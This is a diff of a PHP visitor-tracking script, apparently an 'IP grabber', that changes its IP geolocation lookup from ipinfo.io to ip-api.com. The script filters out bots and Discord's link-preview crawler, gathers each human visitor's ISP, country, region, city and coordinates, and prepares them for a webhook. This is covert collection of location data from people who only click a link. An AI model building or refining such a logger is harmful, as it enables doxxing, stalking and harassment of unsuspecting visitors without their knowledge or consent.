@@ -10,16 +10,16 @@ if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
 }
 
 //Info
-$Curl = curl_init("http://ipinfo.io/$IP/json"); //Get the info of the IP using Curl
+$Curl = curl_init("http://ip-api.com/json/$IP"); //Get the info of the IP using Curl
 curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
 $Info = json_decode(curl_exec($Curl)); 
 curl_close($Curl);
 
-$ISP = $Info->org;
+$ISP = $Info->isp;
 $Country = $Info->country;
-$Region = $Info->region;
+$Region = $Info->regionName;
 $City = $Info->city;
-$COORD = $Info->loc; // Coordinates
+$COORD = "$Info->lat, $Info->lon"; // Coordinates
 
 //Variables
 $Webhook    = ""; //Webhook here.
